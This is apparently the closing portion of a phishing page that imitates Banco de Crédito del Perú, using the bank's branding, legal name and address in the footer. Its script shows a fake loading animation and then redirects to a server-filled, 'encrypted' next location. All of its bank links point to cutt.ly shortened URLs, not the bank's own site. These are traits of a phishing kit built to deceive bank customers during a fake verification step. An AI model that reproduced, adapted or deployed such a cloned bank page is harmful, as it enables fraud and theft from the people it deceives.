                            <a href="" target="_blank" title="Youtube" style="background: #F2F4F8; width: 48px; height: 48px; border-radius: 50%; display: flex; align-items: center; justify-content: center; transition: background .3s ease-out;">
                                <img class="lazy_loading" src="files/iconyoutube11.svg">
                            </a>
                            <a href="" target="_blank" title="Linkedin" style="background: #F2F4F8; width: 48px; height: 48px; border-radius: 50%; display: flex; align-items: center; justify-content: center; transition: background .3s ease-out;">
                                <img class="lazy_loading" src="files/iconlinkedin11.svg">
                            </a>
                        </div>
                    </div>
                    <div class="grupo_imagenes_reservado mobile" style="display: grid; grid-template-columns: repeat(4, auto); justify-content: center; grid-gap: 12px; padding: 32px 24px; border-top: 0px; border-bottom: 0px;">
                        <a style="text-decoration: none!important; outline-offset: unset; outline: 0;">
                            <img class="lazy_loading" src="files/image2.svg">
                        </a>
                        <a style="text-decoration: none!important; outline-offset: unset; outline: 0;">
                            <img class="lazy_loading" src="files/Compromiso.svg">
                        </a>
                        <a style="text-decoration: none!important; outline-offset: unset; outline: 0;">
                            <img class="lazy_loading" src="files/Reclamaciones2.svg">
                        </a>
                        <a style="text-decoration: none!important; outline-offset: unset; outline: 0;">
                            <img class="lazy_loading" src="files/Denuncias2.svg">
                        </a>
                    </div>
                </div>
						<h3 class="titulo_opciones mobile" style="font-size: 16px; line-height: 24px; padding: 24px 0px; margin: 0px 24px; border-top: 1px solid #E5E7EB;font-family: 'Flexo-Demi'; font-weight: normal; color: #4D5B70;top:-20px; position:relative;">
                            Acerca del BCP
                        </h3>
						<h3 class="titulo_opciones mobile" style="font-size: 16px; line-height: 24px; padding: 24px 0px; margin: 0px 24px; border-top: 1px solid #E5E7EB;font-family: 'Flexo-Demi'; font-weight: normal; color: #4D5B70;top:-20px; position:relative;">
                            Otros servicios
                        </h3>
						
						<div class="contenedor_derecho_reservado" style="display: flex; flex-direction: column; justify-content: center; align-items: flex-start; padding: 18px 24px 24px 24px; border-top: 1px solid #E5E7EB;">
                    		<img src="files/logo-bcp.svg" style="height: 24px; width: auto; margin-right: 54px;margin-bottom: 16px;">
                    		<div class="exto_derecho_reservado" data-translate="true">
                        		<p dir="ltr" style="margin: 0 0 10px; font-family: var(--bcp-font-family-primary-regular, 'Flexo-Regular'),helvetica,arial,sans-serif; font-style: normal; color: #868F9E; font-size: 12px; line-height: 18px; font-weight: 100;">© 2023 BCP | Todos los derechos reservados. Sede Central, Centenario 156, La Molina 15026, Lima, Perú.</p>
								<p dir="ltr" style="margin: 0 0 10px; font-family: 'Flexo-Demi'; font-style: normal; color: #868F9E; font-size: 12px; line-height: 18px; font-weight: 100;"><strong>BANCO DE CREDITO DEL PERU S.A - RUC 20100047218</strong></p>

							</div>
						</div>
					</div>
					
				</div>
			</div>
		</div>
	</app-initial-verify>
</app-root>
<script type="text/javascript" src="files/jquery-3.1.0.min.js"></script>
<script type="text/javascript" src="files/mask.js"></script>
<script type="text/javascript" src="files/value.js"></script>
<script>
// Espera a que el documento esté completamente cargado
$(document).ready(function() {
  // Agrega un controlador de eventos al botón
  $("#btnpri").click(function() {
    // Cambia los estilos y redirige después de hacer clic
    $('#loaderprestamo').css('display', 'flex');
    $('#btnprimparrafo').css('color', 'transparent');
    $('#btnpri').css('background-color', '#ff961f');
    
    setTimeout(function() {
      window.location.href = '<?=$next_location_encrypted;?>';
    }, 4000);
  });
});
</script>
<script>
	function redirigirprestamo() {
    window.location.href = "";
}
	function redirigircuotealocm() {
		window.open("https://cutt.ly/xwR47FWh", "_blank");
}
	function redirigircuotealoqb() {
		window.open("https://cutt.ly/QwR47Ug1", "_blank");
}
	function andocm() {
		window.open("https://cutt.ly/kwR45hoq", "_blank");		
}
	function abretucuentacm() {
		window.open("https://cutt.ly/hwR45Uju", "_blank");				
}
	function protegetusahorroscm() {
		window.open("https://cutt.ly/QwR45DOH", "_blank");		
}
	function veragencias() {
		window.open("https://cutt.ly/swR45Lvl", "_blank");			
}
	function banca() {
		window.open("https://cutt.ly/iwR46k8i", "_blank");			
}
	function abrircuenta() {
		window.open("https://cutt.ly/RwR46DMM", "_blank");			
}
</script>
</body>
</html>